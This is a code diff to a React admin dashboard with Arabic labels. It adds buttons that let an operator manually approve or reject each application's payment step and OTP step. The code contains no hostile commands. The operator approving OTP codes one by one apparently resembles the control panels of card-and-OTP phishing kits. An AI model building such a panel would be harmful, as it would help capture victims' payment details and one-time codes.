@@ -613,21 +613,71 @@ const DashboardApplications = () => {
                           </div>
                         </div>
 
-                        {/* شريط الحالة */}
+                        {/* شريط الحالة والأزرار */}
                         <div className="pt-4 border-t">
-                          <div className="flex flex-wrap gap-2 items-center">
-                            <Badge variant={app.status === 'rejected' ? 'destructive' : 'secondary'}>
-                              الحالة: {app.status === 'rejected' ? 'مرفوض' : app.current_step === 'otp' && app.otp_approved ? 'مكتمل' : 'قيد المعالجة'}
-                            </Badge>
-                            {app.current_step === 'payment' && !app.payment_approved && (
-                              <Badge variant="outline" className="bg-orange-100 dark:bg-orange-950 animate-pulse">
-                                في انتظار موافقة الدفع 💳
+                          <div className="flex flex-wrap gap-2 items-center justify-between">
+                            <div className="flex flex-wrap gap-2 items-center">
+                              <Badge variant={app.status === 'rejected' ? 'destructive' : 'secondary'}>
+                                الحالة: {app.status === 'rejected' ? 'مرفوض' : app.current_step === 'otp' && app.otp_approved ? 'مكتمل' : 'قيد المعالجة'}
                               </Badge>
-                            )}
-                            {app.current_step === 'otp' && !app.otp_approved && (
-                              <Badge variant="outline" className="bg-blue-100 dark:bg-blue-950 animate-pulse">
-                                في انتظار موافقة OTP 🔐
-                              </Badge>
+                              {app.current_step === 'payment' && !app.payment_approved && (
+                                <Badge variant="outline" className="bg-orange-100 dark:bg-orange-950 animate-pulse">
+                                  في انتظار موافقة الدفع 💳
+                                </Badge>
+                              )}
+                              {app.current_step === 'otp' && !app.otp_approved && (
+                                <Badge variant="outline" className="bg-blue-100 dark:bg-blue-950 animate-pulse">
+                                  في انتظار موافقة OTP 🔐
+                                </Badge>
+                              )}
+                            </div>
+                            
+                            {/* أزرار الموافقة والرفض السريعة */}
+                            {app.status !== 'rejected' && (
+                              <div className="flex gap-2">
+                                {app.current_step === 'payment' && !app.payment_approved && (
+                                  <>
+                                    <Button
+                                      onClick={() => approveStep(app.id, 'payment_approved')}
+                                      size="sm"
+                                      className="bg-green-600 hover:bg-green-700 gap-1"
+                                    >
+                                      <CheckCircle className="h-4 w-4" />
+                                      موافقة الدفع
+                                    </Button>
+                                    <Button
+                                      onClick={() => rejectStep(app.id)}
+                                      size="sm"
+                                      variant="destructive"
+                                      className="gap-1"
+                                    >
+                                      <XCircle className="h-4 w-4" />
+                                      رفض
+                                    </Button>
+                                  </>
+                                )}
+                                {app.current_step === 'otp' && !app.otp_approved && (
+                                  <>
+                                    <Button
+                                      onClick={() => approveStep(app.id, 'otp_approved')}
+                                      size="sm"
+                                      className="bg-green-600 hover:bg-green-700 gap-1"
+                                    >
+                                      <CheckCircle className="h-4 w-4" />
+                                      موافقة OTP
+                                    </Button>
+                                    <Button
+                                      onClick={() => rejectStep(app.id)}
+                                      size="sm"
+                                      variant="destructive"
+                                      className="gap-1"
+                                    >
+                                      <XCircle className="h-4 w-4" />
+                                      رفض
+                                    </Button>
+                                  </>
+                                )}
+                              </div>
                             )}
                           </div>
                         </div>
